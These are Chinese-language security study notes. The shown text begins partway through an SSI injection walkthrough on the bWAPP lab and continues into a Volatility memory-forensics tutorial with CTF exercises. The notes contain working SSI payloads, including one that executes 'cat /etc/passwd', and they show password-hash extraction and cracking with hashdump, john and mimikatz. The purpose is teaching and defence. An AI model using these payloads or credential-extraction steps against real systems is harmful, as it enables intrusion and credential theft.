![img](https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/10.png)

但是输入数字和用/括起来的字符串还是能正常输出的：

![img](https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/11.png)

即目前可知，后台程序对引号都进行了转义的出来。

意料之中，Low级SSI注入的payload输进去后没执行成功：

![img](https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/7.png)

一个个字符尝试，从XSS能注入的话是发现尖括号`<>`是没有被过滤的；接着对着之前的payload逐个字符去掉，发现将双引号去掉就能执行了：

```
<!--#exec cmd=whoami -->
```

![img](https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/8.png)

虽然可以执行whoami命令，但是对于需要参数输入的命令是没办法执行了的，因为没有引号将整条命令括起来而中间存在空格，这样后台是没办法识别出整条命令的。

那么尝试将双引号替换为单引号，同样失效；这时可以想象平时进行命令注入利用的时候，我们可以利用哪些特殊字符，如换行符\n、反引号`、分号;、管道符|、与运算符&等等，逐一尝试，最后发现反引号成功执行命令：

```
<!--#exec cmd=`cat /etc/passwd`-->
```

![img](https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/9.png)

#### High级

此级别下，后台程序对输入的内容进行了HTML编码后才输出到页面中，即完全防御住了XSS漏洞，同时也让SSI注入无法成功进行：

![img](https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/12.png)

![img](https://www.mi1k7ea.com/2019/09/28/SSI%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/13.png)

最为重要的尖括号`<>`都被HTML编码了，那就不可能再插入标签了，而SSI注入就是注入标签，这下啥戏都没有了。

这也从另一方面说明，成功防御XSS漏洞的HTML输出编码也能够有效防御SSI注入漏洞。

#### 源码简析

在ssii.php中，关键代码如下，不同级别下xss()函数中调用的过滤函数是不一样的：

```
include("security.php");
include("security_level_check.php");
include("functions_external.php");
include("selections.php");

$field_empty = 0;

function xss($data)
{

    switch($_COOKIE["security_level"])
    {

        case "0" :

            $data = no_check($data);
            break;

        case "1" :

            $data = xss_check_4($data);
            break;

        case "2" :

            $data = xss_check_3($data);
            break;

        default :

            $data = no_check($data);
            break;

    }       

    return $data;

}

if(isset($_POST["form"]))
{

    $firstname = ucwords(xss($_POST["firstname"]));
    $lastname = ucwords(xss($_POST["lastname"]));

    if($firstname == "" or $lastname == "")
    {

        $field_empty = 1;

    }

    else
    {

        $line = '<p>Hello ' . $firstname . ' ' . $lastname . ',</p><p>Your IP address is:' . '</p><h1><!--#echo var="REMOTE_ADDR" --></h1>';

        // Writes a new line to the file
        $fp = fopen("ssii.shtml", "w");
        fputs($fp, $line, 200);
        fclose($fp);

        header("Location: ssii.shtml");

        exit;

    }

}
```

下面我们跟到functions_external.php，查看几个防御函数是怎么写的：

```
function no_check($data)
{    
   
    return $data;
        
}

function xss_check_3($data, $encoding = "UTF-8")
{

    // htmlspecialchars - converts special characters to HTML entities    
    // '&' (ampersand) becomes '&amp;' 
    // '"' (double quote) becomes '&quot;' when ENT_NOQUOTES is not set
    // "'" (single quote) becomes '&#039;' (or &apos;) only when ENT_QUOTES is set
    // '<' (less than) becomes '&lt;'
    // '>' (greater than) becomes '&gt;'  
    
    return htmlspecialchars($data, ENT_QUOTES, $encoding);
       
}

function xss_check_4($data)
{
  
    // addslashes - returns a string with backslashes before characters that need to be quoted in database queries etc.
    // These characters are single quote ('), double quote ("), backslash (\) and NUL (the NULL byte).
    // Do NOT use this for XSS or HTML validations!!!
    
    return addslashes($data);
    
}
```

no_check()函数无任何过滤，对应Low级；xss_check_4()函数调用addslashes()函数进行过滤，即对引号继续转义操作，对应Medium级；xss_check_3()函数调用防御XSS的终极Boss——htmlspecialchars()函数进行过滤，将尖括号等进行了转义，对应High级。

## 0x03 检测与防御

### 检测方法

搜索是否存在.stm,.shtm和.shtml后缀的文件，若存在则进一步判断Web服务是否支持并开启了SSI，若开启了则进一步分析上述后缀的文件中是否存在用户输入内容未经过有效过滤就反射输出到页面中，若有则存在SSI注入漏洞。

### 防御方法

- 若非必须，尽量关闭服务器的SSI功能；
- 对用户的输入进行严格的过滤，过滤相关SSI特殊字符（`<,>,#,-,",'`）；

## 0x04 参考

[服务器端包含注入SSI分析总结](https://www.secpulse.com/archives/66934.html)

# 内存取证

> 参考：[使用手册]https://github.com/volatilityfoundation/volatility/wiki/Command-Reference
>
> 参考：https://blog.csdn.net/m0_68012373/article/details/127419463

## 1. 工具介绍

### 1.1 查看镜像系统

拿到一个内存文件之后，第一步肯定是分析这个内存文件并确定`profile`

`profile`是用来描述特定操作系统内核的数据结构和符号信息的。每个操作系统版本都有一个对应的`profile`，这个`profile`包含了操作系统内核的数据结构布局和重要符号的地址。这些信息对于分析内存镜像非常重要，因为它们可以帮助Volatility理解内存中的数据。

```bash
vol.py -f 文件名 imageinfo

┌──(root㉿kali)-[/home/kali]
└─# vol.py -f 桌面/worldskills3.vmem imageinfo
Volatility Foundation Volatility Framework 2.6.1
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418
                     AS Layer1 : WindowsAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/kali/桌面/worldskills3.vmem)
                      PAE type : No PAE
                           DTB : 0x187000L
                          KDBG : 0xf80004044070L
          Number of Processors : 1
     Image Type (Service Pack) : 0
                KPCR for CPU 0 : 0xfffff80004045d00L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2019-06-10 10:34:38 UTC+0000
     Image local date and time : 2019-06-10 18:34:38 +0800
```

### 1.2 查看进程信息

查看当前正在运行的进程，但是无法查看==被取消进程与活动进程列表的链接（进程）==

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py -f 桌面/worldskills3.vmem --profile=Win7SP1x64 pslist     
```

psscan 模块不信任进程的链表，而是通过启发式查找代表进程的 EPROCESS 结构来搜索内存。因此，它列出了所有进程，这些进程甚至被 rootkit 隐藏并且没有被 pslist 命令显示或者windows的tasklist命令。

人话：主要用`psscan`就行，能看到更多的东西；并且`psscan`在能看到进程结束时间的基础上还能看到当前相同程序的进程的运行

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py -f 桌面/worldskills3.vmem --profile=Win7SP1x64 psscan
Volatility Foundation Volatility Framework 2.6.1
Offset(P)          Name                PID   PPID PDB                Time created                   Time exited(程序结束时间)                   
------------------ ---------------- ------ ------ ------------------ ------------------------------ ------------------------------
0x000000007ec9bb30 PING.EXE           1012   2004 0x0000000026e4c000 2019-06-10 10:32:20 UTC+0000   2019-06-10 10:32:35 UTC+0000  

```

`pstree`可以查看进程与进程之间的关系（父子关系），可通过这个插件来对病毒做朔源

```
┌──(root㉿kali)-[/home/kali]
└─# vol.py -f 桌面/worldskills3.vmem --profile=Win7SP1x64 pstree
```

### 1.3 `procdump` 进程转存

`procdump`可以转存内存镜像中的进程转存为一个可执行文件到本地，后续可以直接将这个文件上传到沙盒做测试来判断有没有病毒

```bash
vol.py -f 文件名 --profile=Win7SP1x64 procdump -p PID值 --dump-dir=输出路径

┌──(root㉿kali)-[/home/kali]
└─# vol.py -f 桌面/worldskills3.vmem --profile=Win7SP1x64 procdump -p 1216 --dump-dir=./
Volatility Foundation Volatility Framework 2.6.1
Process(V)         ImageBase          Name                 Result
------------------ ------------------ -------------------- ------
0xfffffa801b362b30 0x00000000ff500000 svchost.exe          OK: executable.1216.exe
                                                                                      
```

### 1.4 `memdump` 内存转存

`memdump`：提取出指定进程，常用foremost 来分离里面的文件  

需要指定进程` -p [pid]` 和输出目录 -D

`memdump -p 332 -D XX/   `

提取进程   -p 进程号 -D 当前输出路径（导出为332.dmp）

dump出来的进程文件，可以使用 foremost 来分离里面的文件，用 binwak -e 不推荐

`strings -e l 2040.dmp | grep flag 查找flag`

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py -f 桌面/worldskills3.vmem --profile=Win7SP1x64 memdump -p 1216 --dump-dir=./
Volatility Foundation Volatility Framework 2.6.1
************************************************************************
Writing svchost.exe [  1216] to 1216.dmp
```

### 1.5 `modscan` 驱动程序扫描

modscan 命令通过扫描物理内存中的池标记来查找 LDR_DATA_TABLE_ENTRY 结构。这可以获取以前卸载的驱动程序和已被 Rootkit 隐藏/取消链接的驱动程序

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py -f 桌面/worldskills3.vmem --profile=Win7SP1x64 modscan  
```

### 1.6 `netscan` 网络扫描

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py -f 桌面/worldskills3.vmem --profile=Win7SP1x64 netscan
```

### 1.7 `malfind` 恶意软件分析

**malfind插件**用于寻找可能注入到各种进程中的恶意软件。使用malfind时也可以使用-p直接指定进程，如果在指定了进程号后没有回显，则表明`malfind`插件认为该进程并没有恶意

![在这里插入图片描述](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MjU4MjI0MQ==,size_16,color_FFFFFF,t_70.png)

### 1.8 `hashdump` 查看用户密码

这里需要配合`john`做密码爆破

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py -f 桌面/worldskills3.vmem --profile=Win7SP1x64 hashdump  
Volatility Foundation Volatility Framework 2.6.1
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
admin:1000:aad3b435b51404eeaad3b435b51404ee:29fb61bd2963b1975cf435a2565af910:::
```

完整爆破流程

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py -f 桌面/worldskills3.vmem --profile=Win7SP1x64 hashdump > hash.txt
Volatility Foundation Volatility Framework 2.6.1
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
admin:1000:aad3b435b51404eeaad3b435b51404ee:29fb61bd2963b1975cf435a2565af910:::

# 这里没爆出来
# john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (NT [MD4 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=6
Press 'q' or Ctrl-C to abort, almost any other key for status
                 (Administrator)     
1g 0:00:00:02 DONE (2023-12-02 09:23) 0.3968g/s 5691Kp/s 5691Kc/s 5693KC/s      markinho..index.php.swp
Warning: passwords printed above might not be all those cracked
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed. 

┌──(root㉿kali)-[/home/kali/test]
└─# john --show hash.txt 
0 password hashes cracked, 3 left
```

### 1.9 `lsadump` 查看强密码

如果john爆破不出来，就使用`lsadump`

```bash
┌──(root㉿kali)-[/home/kali/test]
└─# vol.py -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 lsadump
Volatility Foundation Volatility Framework 2.6.1
DefaultPassword
0x00000000  4c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   L...............
0x00000010  66 00 6c 00 61 00 67 00 7b 00 34 00 30 00 36 00   f.l.a.g.{.4.0.6.
0x00000020  39 00 39 00 30 00 66 00 66 00 38 00 38 00 66 00   9.9.0.f.f.8.8.f.
0x00000030  31 00 33 00 64 00 61 00 63 00 33 00 63 00 39 00   1.3.d.a.c.3.c.9.
0x00000040  64 00 65 00 62 00 62 00 63 00 30 00 37 00 36 00   d.e.b.b.c.0.7.6.
0x00000050  39 00 35 00 38 00 38 00 63 00 7d 00 00 00 00 00   9.5.8.8.c.}.....

DPAPI_SYSTEM
0x00000000  2c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ,...............
0x00000010  01 00 00 00 22 0c 11 ce 0e f5 6b c9 f3 4e 83 b0   ....".....k..N..
0x00000020  8c 0f 9e 75 79 4e 6f 6a 2e 78 8c 18 2e 81 74 3b   ...uyNoj.x....t;
0x00000030  bb 2c 09 a5 bb b2 5d a3 3f 1e 79 09 00 00 00 00   .,....].?.y.....
```

### 1.10 `mimikatz` 插件爆破密码

#### 1.10.1 `mimikatz` 插件安装

> 下载地址：https://github.com/ruokeqx/tool-for-CTF/tree/master/volatility_plugins

![image-20231202225815455](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231202225815455.png)

使用`git clone`下载到本地之后将脚本文件复制到Volatility的插件目录

```bash
┌──(root㉿kali)-[/home/kali/test]
└─# cp /home/kali/ctfTool/volatility_plugins/tool-for-CTF/volatility_plugins/lastpass.py /home/kali/vol/volatility/volatility/plugins
```

这里可能会有一个依赖问题，需要安装一个：`construct==2.10.54`，不行用`pip2`试一下

```bash
┌──(kali㉿kali)-[~/volatility/volatility/plugins]
└─$ pip install construct==2.10.54    
DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality.                                                                               
Processing /root/.cache/pip/wheels/af/8e/c5/686cebf634111570b5dde5b340fcff57968f6c57e9d1024a0f/construct-2.10.54-py2-none-any.whl
Installing collected packages: construct
Successfully installed construct-2.10.54
```

#### 1.10.2 `mimikatz` 爆破密码

```bash
┌──(root㉿kali)-[/home/kali/test]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 mimikatz 
Volatility Foundation Volatility Framework 2.6.1
Module   User             Domain           Password                                
-------- ---------------- ---------------- ----------------------------------------
wdigest  admin            WIN-9FBAEH4UV8C  flag{406990ff88f13dac3c9debbc0769588c}  
wdigest  WIN-9FBAEH4UV8C$ WORKGROUP 
```

### 1.11 `iehistory` 获取系统浏览器搜索过的关键词

```bash
┌──(root㉿kali)-[/home/kali/test]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 iehistory
Volatility Foundation Volatility Framework 2.6.1
**************************************************
Process: 2208 explorer.exe
Cache type "URL " at 0x3255000
Record length: 0x100
Location: Visited: admin@file:///C:/Users/admin/Desktop/flag.txt
Last modified: 2019-06-07 05:44:58 UTC+0000
Last accessed: 2019-06-07 05:44:58 UTC+0000
File Offset: 0x100, Data Offset: 0x0, Data Length: 0xa0
```

### 1.12 `filescan` 扫描文件

通常配合`grep`使用

```bash
┌──(root㉿kali)-[/home/kali/test]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 filescan |grep -E "png|jpg|gif|zip|rar|7z|pdf|txt|doc|flag"
0x000000007f1b6c10     16      0 RW-r-- \Device\HarddiskVolume1\Users\admin\Desktop\flag.txt
```

### 1.13 `dumpfiles` 下载文件

```bash
# volatility -f 1.vmem --profile=Win7SP1x64 dumpfiles -Q 0xxxxxxxx(内存地址) -D ./

┌──(root㉿kali)-[/home/kali/test]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 dumpfiles -Q 0x000000007f1b6c10 -D ./
Volatility Foundation Volatility Framework 2.6.1
DataSectionObject 0x7f1b6c10   None   \Device\HarddiskVolume1\Users\admin\Desktop\flag.txt

┌──(root㉿kali)-[/home/kali/test]
└─# cat file.None.0xfffffa801a879510.dat                                                   
flag{180d163ca48c793cb0db74fb96d6a882}  
```

###  1.14 `notepad` 查看记事本内容

大部分的`profile`都不支持，可以试试`editbox`

```bash
┌──(root㉿kali)-[/home/kali/test]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 notepad                              
Volatility Foundation Volatility Framework 2.6.1
```

### 1.15 `editbox` 显示曾经编辑过的内容

```bash
┌──(root㉿kali)-[/home/kali/test]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 editbox
Volatility Foundation Volatility Framework 2.6.1
```

### 1.16 `screenshot` 获取桌面截图

这里可能需要一个依赖，先连接香港节点

```bash
proxychains4 pip install Pillow    
```

```bash
┌──(root㉿kali)-[/home/kali/test]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 screenshot --dump-dir=./
Volatility Foundation Volatility Framework 2.6.1
Wrote ./session_0.Service-0x0-3e7$.Default.png
Wrote ./session_0.Service-0x0-3e4$.Default.png
Wrote ./session_0.Service-0x0-3e5$.Default.png
Wrote ./session_0.msswindowstation.mssrestricteddesk.png
Wrote ./session_0.WinSta0.Default.png
Wrote ./session_0.WinSta0.Disconnect.png
Wrote ./session_0.WinSta0.Winlogon.png
Wrote ./session_1.WinSta0.Default.png
Wrote ./session_1.WinSta0.Disconnect.png
Wrote ./session_1.WinSta0.Winlogon.png
```

### 1.17 `hivelist` 查看注册表

 列出所有的注册表项及其虚拟地址和物理地址

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 hivelist
```

### 1.18 `hivedump` 查看注册键名

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 hivedump -o 0xfffff8a000024010
```

### 1.9 `printkey` 查看注册表键值

这里以**查看主机名**为例

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 printkey -K "ControlSet001\Control\ComputerName\ComputerName"
Volatility Foundation Volatility Framework 2.6.1
Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \REGISTRY\MACHINE\SYSTEM
Key name: ComputerName (S)
Last updated: 2019-06-07 04:34:14 UTC+0000

Subkeys:

Values:
REG_SZ                        : (S) mnmsrvc
REG_SZ        ComputerName    : (S) WIN-9FBAEH4UV8C
```

这里以**列出用户名**为例

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 printkey -K "SAM\Domains\Account\Users\Names"                
Volatility Foundation Volatility Framework 2.6.1
Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \SystemRoot\System32\Config\SAM
Key name: Names (S)
Last updated: 2019-06-07 04:37:21 UTC+0000

Subkeys:
  (S) admin
  (S) Administrator
  (S) Guest

Values:
REG_NONE                      : (S) 
```

### 1.20 `timeliner` 查看系统时间线

将所有操作系统事件以时间线的方式展开

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 timeliner
```

### 1.21 `clipboard` 查看剪贴板内容

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 clipboard
```

### 1.22 `mftparser` 恢复被删除的文件

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 mftparser |more
```

### 1.23 `envars` 查看环境变量

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 envars
```

### 1.24 `dlllist` 列出某一进程的所有dll文件

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 dlllist -p 2188 
```

### 1.25 `verinfo` 列出程序版本信息

列出PE｜程序版本信息

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 verinfo  
```

### 1.26`shimcache` 从内存文件中找到异常程序植入到系统的开机自启痕迹

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 shimcache
```

### 1.27 `cmdline` 显示进程的命令行参数

`cmdline`可显示进程的启动路径和启动参数

```bash
┌──(root㉿kali)-[/home/kali/test]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/Challenge.raw --profile=Win7SP1x86_23418 cmdline
```

### 1.28 `cmdscan` 查看cmd历史命令

```bash
┌──(root㉿kali)-[/home/kali/test]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/Challenge.raw --profile=Win7SP1x86_23418 cmdscan
```

### 1.29 `consoles`  查看cmd输出结果

```bash
┌──(root㉿kali)-[/home/kali/test]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/Challenge.raw --profile=Win7SP1x86_23418 consoles
```

### 1.30 `mftparser` 查看内存镜像的MFT表

对于NTFS文件系统，会有一个MFT表，单位为1024字节（1K），对于小于或等于1024字节的文件，NTFS会直接将这个文件记录到MFT表中；对于大于1024字节的文件，则会记录这个文件存储位置

```bash
┌──(root㉿kali)-[/home/kali/test]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/MemoryDump_Lab4.raw --profile=Win7SP1x64 mftparser > mft.txt
```

## 2. 例题

### 2.1 第46届世界技能大赛湖北省选拔赛

```
1、从内存中获取到用户admin的密码并且破解密码，以Flag{admin,password} 形式提交(密码为 6 位)；   
2、获取当前系统 ip 地址及主机名，以 Flag{ip:主机名}形式提交；
3、获取当前系统浏览器搜索过的关键词，作为 Flag 提交；
4、当前系统中存在挖矿进程，请获取指向的矿池地址，以 Flag{ip:端口}形式 提交；
5、恶意进程在系统中注册了服务，请将服务名以 Flag{服务名}形式提交。
```

#### 2.1.1 mimikaze 获取账户密码

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 mimikatz       
Volatility Foundation Volatility Framework 2.6.1
Module   User             Domain           Password                                
-------- ---------------- ---------------- ----------------------------------------
wdigest  admin            WIN-9FBAEH4UV8C  flag{406990ff88f13dac3c9debbc0769588c}  
wdigest  WIN-9FBAEH4UV8C$ WORKGROUP   
```

#### 2.1.2 获取主机名和IP地址

```bash
# 获取IP地址
┌──(root㉿kali)-[/home/kali]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 netscan 

# 获取主机名
┌──(root㉿kali)-[/home/kali]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 printkey -K "ControlSet001\Control\ComputerName\ComputerName"
Volatility Foundation Volatility Framework 2.6.1
Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \REGISTRY\MACHINE\SYSTEM
Key name: ComputerName (S)
Last updated: 2019-06-07 04:34:14 UTC+0000

Subkeys:

Values:
REG_SZ                        : (S) mnmsrvc
REG_SZ        ComputerName    : (S) WIN-9FBAEH4UV8C
```

#### 2.1.3 获取浏览器搜索过的关键词

```bash
┌──(root㉿kali)-[/home/kali]
└─# vol.py --plugins=/home/kali/vol/volatility/volatility/plugins -f /home/kali/桌面/worldskills3.vmem --profile=Win7SP1x64 iehistory                                                    
Volatility Foundation Volatility Framework 2.6.1
**************************************************
Process: 2208 explorer.exe
Cache type "DEST" at 0x4773e89
Last modified: 2019-06-07 13:44:58 UTC+0000
Last accessed: 2019-06-07 05:45:00 UTC+0000
URL: admin@file:///C:/Users/admin/Desktop/flag.txt
```

#### 2.1.4 获取挖矿程序的端口号和IP地址

这里说一下大致的排查流程，首先，通过`malfind`查找恶意程序，发现有多个`svchost.exe`程序，使用`pstree | grep "svchost.exe"`可以看到一个可疑程序，可以看到只有这个程序的PPID是不同的

![image-20231203154441111](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203154441111.png)

使用`malfind`再分析一次，确实能出现结果，一般到这一步就可以使用`procdump`将进程下载下来拿去做沙盒分析

![image-20231203154544637](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203154544637.png)

既然确定了恶意程序的PID值，那么就可以使用`netscan`来排查出地址和端口了

![image-20231203154729506](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203154729506.png)

#### 2.1.5 查找恶意进程注册服务

`volatility`可以用`svcscan`插件来查找具体的服务名称，由于恶意程序的PPID是3036，所以这里也可以推测出服务名为：`VMnetDHCP`

![image-20231203154929196](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203154929196.png)

### 2.2 MemLabs Labs

#### 2.2.1 MemLabs 新手关

> **Challenge Description**
>
> My friend John is an "environmental" activist and a humanitarian. He hated the ideology of Thanos from the Avengers: Infinity War. He sucks at programming. He used too many variables while writing any program. One day, John gave me a memory dump and asked me to find out what he was doing while he took the dump. Can you figure it out for me?
>
> Challenge file: [Google drive](https://drive.google.com/file/d/1MjMGRiPzweCOdikO3DTaVfbdBK5kyynT/view)

说实话，看来他的题目描述就跟没看一样

首先第一步肯定是先看进程信息的，这里不知道为什么`psscan`不可用，所以只能用`pslist`了，分析进程可以看出当前正在执行一下程序：

+ `VBoxService.exe`：virtual Box
+ `cmd.exe`：cmd 命令行
+ `SearchIndexer.exe`：好像还有一个文件搜素

![image-20231203165139814](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203165139814.png)

既然有`cmd.exe`，那么就可以先用`cmdscan`看看执行了哪些cmd命令，可以看到执行了一个python文件，我尝试过使用`dumpfies`下载文件，但是转存下来的文件却是空的

![image-20231203165413642](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203165413642.png)

使用`console`s查看运行了这个python文件之后的输出情况，拿到一串16进制字符串，直接解码是乱码

![image-20231203165827763](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203165827763.png)

这里再看一下环境变量能拿到下一个提示：`xor and password`

![image-20231203170009585](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203170009585.png)

那么对这串16进制字符串做一个异或运算爆破

```py
# 十六进制解码
src = bytes.fromhex("335d366f5d6031767631707f")

# 由于ASCII字符有8位，所以范围是 0-255
for i in range(0, 255):
    res = ''
    for j in src:
        res += chr(i ^ j)

    print(res)
    
# 结果：1_4m_b3tt3r}
```

提示里面还有一个`password`，那么将密码解密出来，这里`mimikatz`也用不了，对选定的NTLM哈希解密即可获取Flag

![image-20231203171338781](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203171338781.png)

#### 2.2.2 MemLabs Lab 1

> **Challenge description**
>
> My sister's computer crashed. We were very fortunate to recover this memory dump. Your job is get all her important files from the system. From what we remember, we suddenly saw a black window pop up with some thing being executed. When the crash happened, she was trying to draw something. Thats all we remember from the time of crash.
>
> **Note**: This challenge is composed of 3 flags.
>
> **Challenge file**: [MemLabs_Lab1](https://mega.nz/#!6l4BhKIb!l8ATZoliB_ULlvlkESwkPiXAETJEF7p91Gf9CWuQI70)

##### 2.2.2.1 初步分析

首先`pslist`配合`psscan`配合查看，这里将主要的进程提取出来讲

`cmd.exe`：cmd命令行

`mspaint.exe`：Windows画图工具

`WinRAR.exe`：解压软件

![image-20231203195226072](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203195226072.png)

##### 2.2.2.2 Flag1

首先先从最好入手的`cmd.exe`开始分析，先查看一下`cmd`历史记录

![image-20231203195421782](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203195421782.png)

没有看到什么有用的东西，`consoles`一下看看能不能看到cmd输出信息

![image-20231203195545122](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203195545122.png)

找到一串base64值，解码一下拿到第一个flag

![image-20231203195614084](%E6%A9%99%E5%AD%90%E7%A7%91%E6%8A%80.assets/image-20231203195614084.png)

##### 2.2.2.3 Flag2

根据描述信息可知，要恢复画图软件的图片，因为电脑是在中途死机的，那么就是还没来得及保存，图片应该还是保存在内存中的，那么可以尝试使用`memdump`转存文件，并转位`data`后缀

`data`后缀文件可以代表任意的后缀文件，如：png、pdf、html等；只要保证以正确的打开方式打开即可
